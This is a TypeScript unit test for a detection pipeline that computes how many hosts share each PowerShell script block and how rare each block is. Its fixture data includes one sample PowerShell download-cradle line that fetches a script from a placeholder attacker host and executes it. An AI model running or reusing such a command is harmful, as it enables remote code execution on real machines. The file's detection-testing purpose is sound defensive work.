import { createHash } from 'node:crypto';
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { precomputeLfa, prevalence, rarity } from '../../../src/pipeline/lfa-precompute/index.js';

describe('lfa script block hash frequency', () => {
  it('counts unique hosts per script block entity (explicit hash, text hash, id fallback)', () => {
    const scriptText = "IEX (New-Object Net.WebClient).DownloadString('https://evil.example/a.ps1')";
    const textHash = createHash('sha256').update(scriptText, 'utf8').digest('hex');

    const events = [
      {
        timestamp: '2026-04-12T00:00:00.000Z',
        source: 'powershell',
        event_type: 'script_block',
        host: 'WS01',
        script_block_text: scriptText,
      },
      {
        timestamp: '2026-04-12T00:00:05.000Z',
        source: 'powershell',
        event_type: 'script_block',
        host: 'WS02',
        script_block_text: scriptText,
      },
      {
        timestamp: '2026-04-12T00:00:10.000Z',
        source: 'powershell',
        event_type: 'script_block',
        host: 'WS03',
        script_block_hash: 'AABBCCDD',
      },
      {
        timestamp: '2026-04-12T00:00:15.000Z',
        source: 'powershell',
        event_type: 'script_block',
        host: 'WS03',
        script_block_hash: 'aabbccdd',
      },
      {
        timestamp: '2026-04-12T00:00:20.000Z',
        source: 'powershell',
        event_type: 'script_block',
        host: 'WS04',
        script_block_id: '{ABC-123}',
      },
      {
        timestamp: '2026-04-12T00:00:25.000Z',
        source: 'powershell',
        event_type: 'script_block',
        host: 'WS05',
        script_block_id: '{abc-123}',
      },
    ];

    const tables = precomputeLfa(events as never[]);

    assert.equal(tables.totalHosts, 5);
    assert.equal(tables.scriptBlockHash.get(textHash), 2);
    assert.equal(tables.scriptBlockHash.get('aabbccdd'), 1);
    assert.equal(tables.scriptBlockHash.get('id:{abc-123}'), 2);
    assert.equal(prevalence(tables.scriptBlockHash, textHash, tables.totalHosts), 2 / 5);
    assert.equal(prevalence(tables.scriptBlockHash, 'aabbccdd', tables.totalHosts), 1 / 5);
    assert.equal(prevalence(tables.scriptBlockHash, 'id:{abc-123}', tables.totalHosts), 2 / 5);
    assert.equal(rarity(tables.scriptBlockHash, textHash, tables.totalHosts), 3 / 5);
    assert.equal(rarity(tables.scriptBlockHash, 'aabbccdd', tables.totalHosts), 4 / 5);
    assert.equal(rarity(tables.scriptBlockHash, 'id:{abc-123}', tables.totalHosts), 3 / 5);
  });
});
